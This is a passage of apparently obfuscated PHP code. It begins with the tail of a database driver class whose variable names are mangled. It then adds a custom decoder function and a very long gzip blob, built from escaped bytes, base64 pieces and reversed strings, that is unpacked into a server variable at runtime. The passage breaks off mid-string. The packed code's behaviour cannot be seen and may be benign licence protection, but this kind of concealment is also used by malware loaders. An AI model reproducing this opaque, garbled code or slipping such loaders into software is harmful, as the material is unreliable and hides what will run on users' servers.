str_replace(array($à¯Ã²õ¾[1140], $à¯Ã²õ¾[1141], $à¯Ã²õ¾[1142], $à¯Ã²õ¾[1143], $à¯Ã²õ¾[1144], $à¯Ã²õ¾[1145], $à¯Ã²õ¾[1146], $à¯Ã²õ¾[1147], $à¯Ã²õ¾[1148], $à¯Ã²õ¾[1149], $à¯Ã²õ¾[1150]), array($this->parseTable("{$¬æĞ¨½[$à¯Ã²õ¾[368]]}"), $this->parseDistinct(isset($¬æĞ¨½[$à¯Ã²õ¾[1151]]) ? $¬æĞ¨½[$à¯Ã²õ¾[1151]] : !1), $this->parseField(!empty($¬æĞ¨½[$à¯Ã²õ¾[362]]) ? $¬æĞ¨½[$à¯Ã²õ¾[362]] : $à¯Ã²õ¾[223]), $this->parseJoin(!empty($¬æĞ¨½[$à¯Ã²õ¾[371]]) ? $¬æĞ¨½[$à¯Ã²õ¾[371]] : $à¯Ã²õ¾[12]), $this->parseWhere(!empty($¬æĞ¨½[$à¯Ã²õ¾[364]]) ? $¬æĞ¨½[$à¯Ã²õ¾[364]] : $à¯Ã²õ¾[12]), $this->parseGroup(!empty($¬æĞ¨½[$à¯Ã²õ¾[590]]) ? $¬æĞ¨½[$à¯Ã²õ¾[590]] : $à¯Ã²õ¾[12]), $this->parseHaving(!empty($¬æĞ¨½[$à¯Ã²õ¾[1152]]) ? $¬æĞ¨½[$à¯Ã²õ¾[1152]] : $à¯Ã²õ¾[12]), $this->parseOrder(!empty($¬æĞ¨½[$à¯Ã²õ¾[452]]) ? $¬æĞ¨½[$à¯Ã²õ¾[452]] : $à¯Ã²õ¾[12]), $this->parseLimit(!empty($¬æĞ¨½[$à¯Ã²õ¾[379]]) ? $¬æĞ¨½[$à¯Ã²õ¾[379]] : $à¯Ã²õ¾[12]), $this->parseUnion(!empty($¬æĞ¨½[$à¯Ã²õ¾[433]]) ? $¬æĞ¨½[$à¯Ã²õ¾[433]] : $à¯Ã²õ¾[12]), $this->parseComment(!empty($¬æĞ¨½[$à¯Ã²õ¾[440]]) ? $¬æĞ¨½[$à¯Ã²õ¾[440]] : $à¯Ã²õ¾[12])), $×ÒÛ½üÒ); return $×ÒÛ½üÒ; } public function getLastSql($­“İ¢Úô = '') { return $­“İ¢Úô ? $this->modelSql[$­“İ¢Úô] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($üŠÀíï“) { return addslashes($üŠÀíï“); } public function setModel($Ù¶åµ˜») { $this->model = $Ù¶åµ˜»; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto A‘íëÛ”ÓÂ; BåòøÑÃ«ê: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('àè™¨É'), "\xa8\xed\xdf\x80\xf3\xad"); $_SERVER[É¨™èà] = explode("\174\3\174\4\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x78\x1b\xd5\xd5\x30\xc\x2f\x50\x96\x96\x96\xad\x5\x4a\xb\x13\x87\xc4\x76\xa2\xc5\x76\x76\x27\x4e\x22\xcb\x72\x2c\x22\x4b\x8e\x24\x67\xc1\x36\x93\x91\x34\xb2".base64_decode('J5Y0imbkLQkvBELYwr437NDShYSdQFhaKC9QukBb9qUt4CTspS1QCqX/Xc5dZiTD+z/f9zw=').base64_decode('X54kusu5d+5y7rnnnnvOub/acssN265Zv8/6fdfve8MFfz/n4k9oeP3e6Pe/aPi4cw7Yi/w=')."\71\374\234\263\353\352\72\146\37\64\75\372\215\363\357\272\125\373\231\266\115\73\73\26\171\352\327\341\203\177\373\263\23\102\273\156\174\152\164\327\336\173\375\276\317\272\271\31\1\323\262\315\364"."\x47\x29\x98\xb6\xa2\x8f\x18\x96\x6d\xd1\x84\xb4\x59\xc8\x1a\xfd\x34\x6c\x14\xe8\xaf\x9f\xfe\x74\xc7\x23\x25\x3d\x6f\xda\x3a\x8d\xfa\xe8\x8f\xa\xed\x22\xff\x5b\x6b\x73\x6\xcb\x57\xa3\xb1\xa4\x9a\xe8\xee\xea\xa".base64_decode('xZMA1Czn580MhIpaScvD94t6yUKtkatTi2ZRLzhSREJGs7WUZkFNba1qW6grElulJld1hQA=')."\42\245\256\55\353\245\121\32\43\301\204\255\225\354\244\221\327\71\304\160\211\267\253\65\264\44\34\125\222\361\100\64\21\10\46\303\261\50\115\16\306\72\73\303\311\312\364\170\54\22\151\15\4"."\227\126\346\164\305\3\113\72\3\12\152\137\116\127\215\102\326\254\123\126\323\234\325\112\75\15\264\33\172\56\103\203\5\215\65\307\36\55\102\50\311\103\150\232\12\345\134\216\106\242\74\224\321"."\xb3\x5a\x39\x7\xa3\xd5\x26\x47\x8a\x25\x23\xaf\xb1\x4e\x2f\xd5\x47\x79\x2a\xd\x68\x65\xdb\x34\xa\x69\x1a\x9\x8d\xd8\x25\x4d\xa4\xa3\xb6\xa6\xd1\x44\xeb\x5\xa8\x2a\x11\x8a\x84\x82\x49\x5\x37\x50\x69\x8f\xc7"."\72\25\230\204\274\146\331\172\111\131\321\21\212\207\24\334\350\226\132\322\327\132\5\360\45\212\206\102\11\104\42\312\104\65\330\172\276\310\252\241\145\252\124\26\213\267\205\342\112\353\52\105\214"."\120\332\314\347\315\202\17\325\202\146\322\226\232\32\212\307\151\300\3\350\35\11\343\111\203\110\254\275\75\21\342\61\350\334\262\10\152\311\14\300\117\107\54\223\315\331\352\220\226\53\63\64\35"."\244\277\265\360\3\277\246\5\250\273\326\50\30\145\100\123\250\302\64\371\262\202\100\231\101\353\54\105\317\100\40\217\312\233\120\56\5\151\51\6\265\206\5\14\264\102\207\150\260\145\41\375\235".strrev('KbS.FÓG„yËG§#Y— Æ2ØXeÌÖxĞ%mÙ¨ø^:À(ÆfÒª¶KÓÎ*Så')."\357\313\40\151\64\302\127\62\206\25\261\42\152\11\47\2\106\166\124\54\105\14\327\305\163\55\263\134\112\353\141\264\164\150\274\21\222\165\333\106\235\143\3\142\166\27\163\246\226\111\350\45\336"."\x35\xc3\x6c\x47\x15\xc5\xca\xb6\x9c\x58\x26\x60\xed\x66\x29\xdf\x86\x88\x86\x9c\xd6\x89\x96\x8d\x21\x12\x7\xd9\x72\xc9\x48\xa3\xe5\xaf\xeb\x39\xd5\xfb\x45\x5f\xcf\x62\xf4\x5f\x3d\x50\xc4\x5e\x68\xcf\x80\x9e\xcb"."\251\372\210\16\353\51\237\231\145\261\201\360\133\51\243\340\107\51\64\32\216\251\3\232\65\320\231\231\245\222\122\214\320\146\364\21\137\161\240\10\213\235\257\357\136\7\276\343\141\213\232\166\110"."\x22\xd7\x39\x33\xad\xe5\xe4\xae\xd0\xf0\x80\x6d\x17\x13\x7a\x21\x83\x47\x1\xba\x62\xe\x17\xc8\x28\x15\x75\x1d\x80\xda\x3c\x4a\x46\xe9\x54\x56\x29\x1d\xcd\x46\xb3\xc5\xa\xe6\x73\x3c\xc4\x7a\xc7\xd3\x2c\x9e\x68"."\x8f\xb0\xa9\xcc\x64\x1\x53\xd9\x6e\x51\x3\x1f\x34\x2c\x42\xf8\xc4\xaa\xd5\x8a\xc5\x9c\x91\xd6\x6c\xc3\x2c\xf8\xcd\xb4\xad\xdb\x5e\xcb\x2e\xe9\x1a\xd4\x18\x48\xa7\x75\xcb\xf2\x6\xcd\x82\x5d\x32\x73\xde\x40\x2e".base64_decode('Zw57YyWj3yg0K9OABqNMtNa9mC42wwKuma9gpMGfmdZStrPeuWxhcuiSVrCyeskbglXRrKA=').base64_decode('xnLiyMDaDKtoWgZuXrOi2baWHsCERVTf8iXwRiFnFPRKWFSJ7u0qaf15rVkpllNoAGAxQlo=')."\32\103\310\300\60\0\315\112\136\33\361\152\375\254\246\320\110\321\50\351\26\353\265\262\244\63\11\30\225\365\166\342\105\144\350\31\157\2\121\156\250\154\106\303\114\5\341\212\302\362\150\152\107"."\62\331\245\206\333\321\326\34\15\251\235\201\144\260\3\152\267\265\176\126\165\4\321\143\136\45\113\134\351\105\213\11\143\123\24\165\116\44\166\231\303\172\11\175\270\165\264\131\31\64\63\51\163"."\xc4\xc7\xb2\x30\x70\x2\x51\x15\x6\x8c\xe7\xb7\x68\x7b\xe3\x5a\xa1\x1f\x77\x23\x35\x6a\xeb\x96\x9b\x2e\xb5\xa2\x8d\xdc\x97\xa5\x2b\xd7\x97\xd2\xb3\x66\x9\x7a\x63\xd\xf5\x3b\x7\x3f\xa2\x17\xfa\xed\x1\x56\x77"."\42\24\137\36\212\253\211\130\173\162\105\40\16\373\176\1\141\316\10\153\15\376\172\316\33\327\63\150\20\323\66\53\247\25\305\350\257\364\342\5\203\77\316\162\361\42\142\171\221\360\22\74\166"."\155\136\13\1\171\145\50\126\167\304\310\33\270\173\66\317\41\203\215\230\202\45\320\40\77\351\163\113\257\65\255\256\67\63\275\336\213\376\237\126\337\323\333\346\233\326\267\310\157\210\62\376\106"."\137\243\322\324\60\133\351\102\134\212\241\345\24\350\164\5\104\203\22\133\352\34\26\201\341\5\263\240\127\135\130\10\221\114\113\367\166\350\32\42\320\150\42\34\363\342\141\337\242\361\57\31\135"."\xbc\x4f\x4a\xb4\xc4\x35\x2f\x34\x31\x1e\x5a\xd6\x1d\x4a\x24\xd5\xce\x50\xb2\x23\xd6\x6\xcd\xf\x5\x20\x54\x40\x85\x49\x7b\xd9\x1c\x63\xa6\xc\xb6\xc4\x2\x54\xab\x8f\x48\xfb\x87\xd8\x7\xd2\xf2\x80\x90\x72\x51"."\x73\x98\x51\x7e\x17\x2\x5\x7\xf4\xf4\xe0\x4\x79\x28\x4\xbd\x31\x29\x5d\x62\x53\xd7\x43\x7f\xfa\x0\x9b\xfb\xe8\x8f\xaa\x6\x23\xa1\x40\x5c\x5\x6e\x56\x35\xac\x76\x69\xb\xc5\x51\x4e\x6e\x55\x33\xb5\x6\x21".base64_decode('WqfO9hT4cDiPlrToiOrc71gvOwXioxW0wsjwDRFFO3SjfwDabeDq0mbOLGk5vBUwHrbfAKo=')."\134\314\225\321\62\360\343\212\223\3\345\174\12\66\56\64\144\375\272\55\330\113\153\24\361\140\171\266\71\243\35\336\16\267\71\266\140\210\371\125\214\272\275\276\142\241\277\376\170\250\113\155\232"."\325\200\23\140\126\241\147\210\317\56\353\225\135\367\245\115\264\316\73\265\101\275\31\367\5\210\333\174\222\312\42\22\375\234\217\267\274\26\67\231\300\263\225\363\345\121\45\244\316\240\311\67\151"."\x7a\x92\x99\xef\xdc\xf2\x14\xbd\x54\x32\x4b\x93\x0\x82\x84\x15\xb2\x6f\xe2\xe9\x82\xca\x6d\xce\x81\x58\x88\x22\xb0\xf0\x80\xc9\x39\x16\x93\xe1\x66\xb3\x1f\xfa\x3d\xa5\xa9\x1d\xa8\x48\x6\x71\x6e\x3e\xcb\x46\x93".strrev('±¦“NÑ$tŸt3Ô›dcÅˆâÏñ˜¨íy˜È‚¿ f\'ğ-Œ%´3Ö'."\n".'å’Õ2e¨:€').base64_decode('T5ZsE2eWHJAISQdMaDTCCuhwmfecjUFGz+kMwQZ0xmo0ABiaGY5+Wb4O0EECpQr+zrDiqCQ=')."\146\14\130\174\5\76\171\211\4\314\35\1\136\211\140\16\315\152\214\54\50\21\357\52\351\131\143\204\221\222\21\273\123\53\15\262\216\241\222\142\51\342\210\264\114\333\273\43\21\65\30\213\46".base64_decode('0cGNpqyIh5MhRrECbWog2AUxQQM5AyezIDRlqAlQCDXCL3gltFkXzQKitECsvOJYV5GVEaw=').base64_decode('BOCOYD9cHAXiCfJj3jyiK17epq5u4AUYVjCWuHUUc7uMdPQXlvOZX5GY6e3oDAS9iY5A06w=')."\xd9\x34\x75\x55\x3e\xd3\x9b\xec\x30\xac\xde\x13\x79\x1c\x9a\x33\x6c\xcd\x54\x4b\x3a\x5a\xd3\xc\x17\x9a\x1a\x1a\xd9\x8a\x43\x7c\x89\x26\x5a\xbe\xca\x9b\xf7\xe2\x5a\x30\x4b\xe9\x6b\x68\x68\x60\x75\x4d\x9f\xad\xc".base64_decode('IFLC6XeG9JadcsrpQV0m55Z32GA073jOjh9fOfhWmexuqpbG1amosF225JFCCJhBRQzGJdM=')."\124\55\327\157\42\274\33\310\313\211\31\216\277\64\256\123\226\13\76\64\240\361\161\302\243\307\26\7\142\350\106\345\102\170\230\121\33\30\375\166\362\330\112\262\372\100\123\326\75\14\243\55\332"."\x51\xc4\x3b\x1b\xa2\xda\x6c\xda\xa6\xd2\x9f\x83\xa0\x19\x65\xb4\x6e\x4b\xc6\x98\x34\xfa\x8b\x58\x4d\x8c\x66\xc6\x12\xf0\xc9\x91\x7c\x4e\x9c\xbf\x60\x68\x60\x34\xe5\xae\x8d\xa8\x28\x47\x85\x1c\x55\xce\xe9\xe0\x74".base64_decode('gM1CZ5trTdDNn6YtWIS+qAxhaY5ZaKlt9DXUKuxU2lLbnWxHfPqihQctCJr5IiYr5AiG+0s=')."\61\167\41\364\161\1\346\201\130\244\313\65\34\241\244\6\273\316\2\277\14\267\300\77\121\255\320\25\314\230\255\124\273\42\201\144\173\54\336\11\70\136\54\12\264\52\246\253\255\66\257\104\234"."\xb4\x2c\xf0\xb7\xe1\x82\x9c\x22\xe8\x9f\x8a\x48\x29\x1b\x48\xc0\xa1\xd6\x40\x22\x1c\x54\xbb\x2\xc9\xe\xfe\x49\xbf\x95\x19\xb4\xfc\x5a\x9\x9d\xac\x87\xd0\x1\x39\xe5\xc7\xa7\x45\x2c\xd3\xf2\xf1\xf3\x14\xa0\x5a"."\32\363\61\252\226\102\33\21\143\272\312\370\320\1\274\15\244\130\136\35\263\357\260\70\265\164\316\265\162\344\51\132\131\165\201\254\254\266\100\126\272\26\310\312\312\5\262\262\32\372\17\101\343"."\xb5\xbc\x36\x66\x16\x10\x19\x41\xfb\x7f\xde\x97\x86\x9e\x25\x3b\xc2\xd1\xa5\x6a\x67\xac\x2d\x14\x51\xc3\x51\xc4\x66\x26\x2b\xd3\xbb\xbb\xda\x2\x8c\x3a\xcb\xe9\xad\x31\x36\x8a\x90\xda\x8d\x18\xcd\xe5\x81\x48\xd8"."\15\36\132\31\116\44\23\125\263\120\132\167\310\225\323\326\252\166\305\103\355\341\225\74\332\36\16\105\332\22\152\60\20\354\20\60\321\100\47\104\20\13\247\347\62\226\337\11\257\42\216\71\301"."\x25\x81\x2a\xac\x3\x86\x29\xb2\xf0\x4d\x65\x62\x25\x55\x6c\x10\xe8\xf4\xa5\xc3\x74\x40\x77\xb1\x2c\x95\xf4\x44\x65\x14\xb4\xcc\xf9\x5f\x26\x6a\xc8\x33\x8c\x41\x27\x47\x18\x76\x76\x6c\xaa\xa3\x3f\xf5\x4a\x20\xa1"."\xd8\x45\x95\xef\xf5\xa9\x51\x1e\x24\xdd\x60\x71\xc4\x1c\xc1\xf7\x15\xe0\xde\x2b\x5a\xa0\x62\x98\x56\xe9\x8c\x56\x3d\x21\x90\xb5\x39\x83\xec\x8a\xa3\x55\x22\xf2\xd0\xc\x4\x88\xd0\x16\x61\x2\x99\x11\xf8\x8c\x81"."\366\311\222\35\140\315\311\12\201\251\32\353\12\305\3\130\334\252\256\210\307\242\113\240\300\360\200\316\32\20\206\341\257\143\207\146\220\272\332\202\335\320\162\206\306\304\157\142\320\327\230\154\50"."\321\52\144\107\221\2\33\347\24\346\265\30\3\316\2\131\104\137\30\237\144\226\171\375\51\323\204\72\163\370\174\10\325\133\14\25\106\30\267\60\235\357\246\200\240\261\245\241\250\312\360\207\306"."\x24\x9c\xa3\x9\xa1\x78\x3c\x16\x87\x6e\xdb\xe6\x20\x93\xcb\xd1\xcc\x78\x28\x11\x82\xf5\x84\x77\x6e\x83\xd\x8a\xdf\x37\x1d\x70\x55\x47\x1c\x26\x7c\xde\x7f\x52\xef\xf0\xf4\xba\x1e\xef\x74\x5f\x1f\xa\xd4\x4f\x5b"."\x4c\xa3\x10\xeb\xf5\x39\xa2\x8c\xf1\x2f\x97\x78\x69\xcc\x94\xd6\x59\x8b\xea\x9b\x7b\xfd\xbd\xfe\xba\x45\xcd\x3d\x1\xef\x98\xe6\x1d\x6b\xf0\xce\xf3\xf6\xa1\xe3\x42\xfd\x74\x48\xe8\x5b\xd7\xe4\x99\xb9\x1\x3\x20"."\300\105\223\373\320\117\113\357\242\51\275\336\251\47\257\136\334\323\333\127\333\74\175\122\257\157\162\357\160\337\264\372\105\354\73\351\162\11\235\110\330\66\213\232\232\231\136\207\232\204\216\320\34"."\244\40\355\12\4\200\145\214\31\105\221\272\156\366\6\226\216\346\115\357\27\45\172\274\275\323\373\26\111\345\244\44\367\267\20\5\105\374\347\0\207\13\170\117\304\75\343\105\361\352\6\234\50"."\x17\xd2\x62\x6f\xc6\xd8\x9f\xd2\xf8\x59\xb4\xbf\x20\xe\x79\x76\x89\xcb\x6a\x87\x10\x46\xa\x3a\xbb\x6e\xa\xfd\xdd\xc0\x26\xb2\x5f\x1f\x61\x4\xa0\x90\x35\x18\x6f\x57\x2e\x18\x6b\xd9\x69\xab\xa0\xaf\x85\x80\x69"."\x73\x2c\xd6\xed\x61\x9d\xa1\x7\x4a\x77\xc4\x11\x72\x30\xda\x8f\xb2\xa4\x58\x4e\xda\x2b\x88\x60\x8d\xe3\x28\x47\x26\xa3\xa8\xe2\x83\xe7\x30\x8f\xa1\xad\x4\xe6\xe9\x40\x80\xb6\xd2\x5a\x51\x4f\x48\x3d\x54\xd5\x64"."\xa0\x35\x12\xe2\xa7\x68\xa0\xb7\x2c\x4e\x68\x5f\x2b\xbf\xd1\x41\x5d\x13\x74\x93\x51\x1\x49\x68\x46\x84\x58\xb0\xbe\xad\xb5\x39\x85\x2c\x7f\x7a\xe2\x6b\x26\x97\x5b\x56\xb9\x88\xf\x6f\xa\x9a\x71\x34\xb6\xa\x62".base64_decode('JpWWhQodciinyhNQ5IcyLHXVxULHdAjaVBQzZKFDETuW+Ot6e8s9eqavByG+5s32rZuxoZ4=')."\111\166\374\275\350\17\213\4\252\134\263\250\232\315\206\204\123\77\165\111\50\351\303\55\342\202\165\107\204\147\323\250\131\342\247\234\242\103\314\140\233\266\226\163\124\221\304\51\214\60\61\306\16"."\304\314\164\336\43\202\136\141\376\107\272\251\42\344\63\312\305\272\234\75\227\256\112\160\211\204\156\373\70\204\107\312\124\121\34\372\327\122\303\310\172\1\55\251\240\264\251\121\21\177\202\310\45"."\x1c\x17\x5b\x96\x8e\xb9\xa5\xf6\x72\x2e\x67\x73\xe9\x50\xce\x18\x84\xba\x61\xbd\xc0\x3d\x9b\x17\xe8\xfe\xf4\x6a\x45\xd1\xd1\x88\x9\x4b\xa7\x41\x33\x6a\xa6\x55\x3\xc\x17\xa\x66\x26\x25\xa3\x9b\xd8\x4e\x97\x4"."\x10\xe3\x92\x54\xea\xd8\x9d\x90\x12\x8e\x2a\xad\xb1\x58\x24\x14\x88\x2a\x78\xe7\x86\x1d\x7\xb1\x5\x89\x50\x57\x0\x6d\x57\x58\xec\x9a\x48\x86\xe0\x9a\x2a\xdc\xe6\x65\xf5\xae\xf4\x32\x21\xb\xf\x18\x30\xe0\x66"."\221\36\156\20\103\231\63\31\1\161\212\151\360\11\321\203\205\45\36\314\105\170\120\253\75\130\276\342\21\347\157\217\270\152\361\14\31\372\60\11\360\263\261\7\216\314\36\41\31\202\140\270\315"."\x63\x58\x6d\xe4\xe8\x4f\x3e\x40\xb2\x58\x13\xec\x1\x2c\x5\xcf\x69\xa3\x1e\xda\x9c\x88\x3e\xa4\xe7\x3c\x4c\x66\xe4\x61\x6d\xf4\x30\x49\x99\x87\x48\xb8\xda\xa0\x59\xdd\x68\x49\x41\xb3\x48\x10\x51\xce\x1\xf\x46".base64_decode('HYy5HnH54zGHC3qJgMDACKmBR0gUPP0ls1zsYt+UYrRZkCDazBPipml7mPDNI0vhoBUBtkI=')."\xaa\xe\x67\xf5\xde\x90\xf1\x77\x37\x2\xf0\xb\x67\x55\x8e\xd2\x57\x4c\x56\xe5\x7c\x38\x5\x90\xeb\x68\x8d\x20\x7c\xdd\xc0\x76\x3a\x7\xc\x11\x4\x72\x3e\x13\xf\xb8\x8\x2d\x17\x4b\x14\x77\xa0\x5d\x83\x6b\x46"."\x5a\xad\x1c\xe6\x8\x5a\x70\x22\xaa\xb8\xeb\x11\x37\x7c\x82\xab\x75\xcb\x82\xdc\x77\x7f\xf8\xa3\xe8\x44\x97\x90\x3e\x67\x6b\xfd\xec\x5b\x98\x4c\xf1\xf3\x5e\x15\x50\x1a\x8e\xeb\xe9\xd1\xb4\x10\x2e\xb5\x49\x22\x2b".base64_decode('Z6zF2R8PWUDVkL/65HKE5nNx0IEHssFlWM4n1rE4vnpZQocI7YsVBQdBG4spbwLtaO05Nho=')."\x4d\x72\x36\xd0\x5c\x8f\x33\x86\x57\x95\x8f\xd0\x60\x72\x8d\x9e\xe0\xe2\xcc\x48\xa8\x3d\xa9\x9c\x10\x43\x64\xcb\x30\x55\x5a\x46\xc5\xc0\xa\xf9\xcf\x2c\x28\x8e\xba\xd9\x70\x29\x2d\x24\x5f\xc4\xb5\x42\x86\xa6\xac"."\x46\xc4\x7d\x75\x4b\xd\xfb\x48\x8d\xa3\xb8\xc0\xf\x67\x23\x3c\x2c\xaa\x54\x62\x1c\x1e\x6e\x79\x10\x30\x1e\x90\xee\x8b\xd\x89\x25\xc5\xc4\xfe\x57\x6\xb6\x4f\xb3\xe0\x98\x85\x85\xc1\x10\xd2\x59\x9a\x98\x5a\x19"."\x21\x25\x3a\x23\x12\x58\xbb\x1c\xdf\xc5\x51\xb1\x98\x18\x4a\x28\xf8\x3\x1e\x89\x51\xc1\xb4\xc4\x2b\x96\x85\x14\x75\xe\xb9\xb\x23\x5d\xbb\x26\x1e\xa2\x2e\xa3\x30\x6a\x14\x12\x6\x16\x6e\xb8\x53\x61\x7d\x93\x26"."\x74\x69\x96\x35\x8c\xb8\x1\xd8\xfe\xa6\x4d\x9b\xa6\x88\x7d\x59\xb0\x5\x78\xd1\x8b\x18\x45\xda\x89\xc2\x74\x73\xc1\x2\x10\xfa\x79\xf\x5c\x63\x7b\xb0\x8\x42\xda\xb8\x85\xdc\x15\x75\x8e\xc8\x41\xf2\x8e\x3b\x90"."\312\216\101\105\22\210\30\40\130\347\260\40\6\264\222\30\153\106\235\60\211\340\175\260\60\210\210\112\140\131\155\110\260\54\216\62\22\215\261\354\121\326\172\71\350\254\224\106\333\74\344\267\3".base64_decode('NV5ezXz2yqjlDIiSJkQqImis0A/pSNL04EsH9EO3d6bNQIDYsijn2+ASA4eXI/rAODU04HU=')."\x8c\xbe\x0\x93\xa1\x4a\x42\x1\x4e\x9f\x9c\x6c\x2\x6d\x49\x80\x93\x7d\xc4\xcb\xe7\xd0\x2e\x57\xf2\xe1\x25\xb4\x4\xef\x55\x6c\x4c\x28\xf5\x93\x51\x32\xa1\xa3\x7e\x42\xf5\xa2\x86\x44\x45\x9e\xc\x2d\x44\x8e\x78".base64_decode('GxDbBr/I4ytQjK9Ybv2iQXg41cp2YAyuHm8vmZzd5Tu+GyhITpZcKcW1S0vj4eAsKpKkMm4=')."\36\303\225\352\212\142\276\243\312\76\4\315\44\367\107\45\272\241\371\320\71\1\164\213\74\15\22\373\45\310\317\72\172\207\7\33\340\6\327\374\332\246\211\16\237\45\137\11\175\121\64\104\42"."\175\100\30\210\216\111\102\313\352\62\323\340\310\14\24\213\242\331\274\176\13\25\221\310\273\223\153\142\165\46\212\32\243\352\212\127\161\325\240\25\213\362\67\71\313\307\20\236\34\115\312\74\101"."\x81\x2b\x5a\xda\x6b\xd1\x25\xde\x56\x9a\x11\xe1\xfc\x32\xa6\x2c\xa1\x8c\x61\xe3\x14\xbc\x54\x4d\x76\xc1\x25\x0\xc5\xde\xeb\x2e\x2c\xe2\xf2\x66\x40\xf6\xb4\xa\xb4\x11\x87\x11\xcf\x14\x7\xa4\x93\x1\x81\xc4\x69".base64_decode('hFnwCX6pulZW2iwCLkmainlzSJcS8V1jUeRIUZotZYlKJSg+FaRFaGVmCJctRoHAQllyTKc=')."\213\337\207\17\45\76\231\304\7\112\45\206\372\264\233\370\36\34\45\312\111\230\162\46\330\272\255\266\21\322\312\103\103\102\17\221\126\205\77\354\243\204\3\137\266\306\12\174\275\210\160\45\250".base64_decode('LJisXlFC6B84Y9XBA7mc0BhzxycsQgmGXEhOmbBYOzkfM7l/tTR+MpqY23df+juJ/MTM0AQ=')."\344\121\114\143\365\70\332\327\203\3\106\101\147\222\234\254\121\262\252\121\273\377\307\134\167\345\310\343\25\62\21\272\340\74\111\204\215\365\241\207\164\371\30\302\45\270\202\124\361\15\277\202\215"."\x1\x56\x42\x8a\xa8\xb6\x83\x1b\x8b\x93\xfa\xa5\xe5\xe4\xc0\x10\xb4\x7c\xe9\x78\xe0\xcd\x2e\x1c\xf3\x59\x13\xe0\xac\x1b\x8e\xab\xd7\x10\x9a\x38\xc2\xf7\x68\xb9\x10\xce\xc2\x73\x29\x57\x2a\xb8\xbf\x2f\x81\xe7\x95"."\xb\x4e\x50\x86\x43\xb8\x8b\x33\x26\x6a\x2b\xcb\xe6\xb5\x5c\xf6\xaf\x47\xb7\x9d\xb5\x83\x86\x7f\x79\xda\x3b\x67\x9e\x71\x25\xa0\x67\x29\x3d\x94\xca\xb2\xcb\x2f\x7c\xfd\xb5\xf\xd\xb\xa5\xf8\x4d\x47\x19\xe6\x31"."\217\177\24\374\127\160\353\13\337\71\142\326\115\165\307\136\366\302\37\67\325\37\173\330\224\263\357\75\376\270\55\107\76\372\352\252\322\143\57\136\75\376\356\317\72\246\175\221\272\253\163\353\267".base64_decode('6uN/3O/tG0KDdy3++l2373NXxwX7/nvOsxf+9zMvXp0eDk9v3Pd3v15nvvbAZw/q/3ry/Gs=')."\36\370\350\315\133\47\75\262\317\51\367\27\137\17\236\377\303\375\237\376\345\276\245\157\224\17\171\345\217\37\75\260\354\224\320\67\367\336\366\362\107\337\177\150\370\302\105\167\35\266\156\323\353"."\377\271\67\275\357\316\243\316\337\57\221\72\170\363\5\177\15\276\176\337\314\206\37\267\355\165\155\252\346\305\360\324\315\257\176\355\324\331\77\154\150\116\251\175\157\55\237\277\371\331\223\324\371".base64_decode('7z43b/WrpW/MXbpz8nDfXsfq8dAFzdNvPvaL9X2fre7c+Gnp6Z/8tXP7756Pz3vpjz2dD/0=')."\311\270\353\236\245\7\173\277\371\267\226\216\337\377\350\73\133\177\170\373\122\357\273\43\341\311\251\117\146\136\276\317\330\355\15\165\277\334\163\150\366\236\267\76\275\377\233\55\347\237\266\173\144"."\xfd\xfd\x97\x3e\xf9\xed\x3b\xf6\x39\xe0\x8d\xe5\x9d\x7f\xbf\x59\x1b\xbd\x2b\x3b\xe9\x66\xdf\x23\x7f\xce\xfc\xf4\x96\xfe\x39\xb3\x67\x4c\xdd\x9c\x7c\xe9\x80\x5f\x4f\xfa\x4b\x36\x16\xdc\x70\xfa\x27\xfb\xe\xbe\x7a".base64_decode('x5ZfZ4du2/uUSfbWdUe8dGvXSd/8sLXj8BcaTt62OLa7f//WGxds/NeOcw8O3LDul7nDd30=')."\353\352\203\116\75\165\167\147\143\343\375\13\17\73\176\266\275\376\241\31\336\327\237\271\177\44\167\320\41\245\137\34\62\373\266\263\17\71\60\345\77\357\312\337\274\176\373\252\347\17\177\374\216"."\273\216\132\364\176\374\230\17\147\234\32\314\36\377\320\346\331\267\165\375\367\373\7\315\73\105\353\211\376\367\276\67\17\5\277\63\257\160\144\372\273\365\221\3\117\367\36\171\202\165\356\136\247"."\x6e\x58\xbf\xd7\xd2\x3\xfe\x62\x5c\xfb\xf3\x7f\x3e\xb6\xf0\xa8\x33\x56\xff\x78\xd6\xf7\xdf\x3b\xf1\x8c\x49\xdb\x9b\x8b\x63\x4f\xf4\xf6\x3e\xfa\xc4\x5\xbf\x3d\xec\xba\x8b\xde\x69\xff\xcb\xf7\xff\xf0\xea\x5e\x47"."\x3c\xd7\x70\xfb\xa9\x87\xbc\xf6\xf3\xc4\xe6\x4f\x9f\x1f\x19\xb8\x4f\xcf\x4\xfa\x8f\x7e\xe5\xb6\xdc\xd2\xd6\x3\x8f\x5a\xbe\x6f\xf6\xe8\x47\x6\x2e\x3f\xf5\xf6\x97\x5f\xf9\x4d\xdf\x2d\xbf\x2b\x1f\xb1\x62\xd1\x37"."\x7d\x93\xf\x38\x73\xe6\xd7\xaf\xb9\xa3\xee\xf4\x83\x9f\x3a\xba\x76\xd2\xfe\xed\x93\xb2\xf7\xed\x75\xdc\x8c\xb\x37\xd6\xaf\x3d\xe2\x26\x6f\x6a\xea\x4d\xdb\x5e\xf2\x5d\xfd\xf0\x59\xbf\x89\x76\x6d\x7d\xed\xf4\x5b".base64_decode('vvurby4oXrFl+mX7f63u0MdP/cGNA39u2LXXAyMLuz58W7t2z237l//rraab9jf+/LTeFgw=')."\x29\xfd\x27\x7e\xf7\x8e\xa7\x6f\xbf\xf4\xeb\x47\x9e\x72\x68\xf9\xa8\x15\xbf\xb8\x7d\xc1\x1d\x17\xdc\x7e\xc8\x4d\xe6\xc6\x4f\x7a\xaf\x7b\xf4\x8a\xc9\x47\x9e\x72\xf0\xc8\x41\xcb\x8e\xb8\xb6\x65\xf5\x23\x87\xac\x2a"."\327\374\141\317\13\215\267\136\177\310\67\342\153\346\75\172\315\23\143\207\377\263\156\122\323\237\316\371\257\313\167\274\376\344\163\253\67\35\372\352\343\351\243\333\16\175\142\331\155\15\176\175\277"."\364\216\1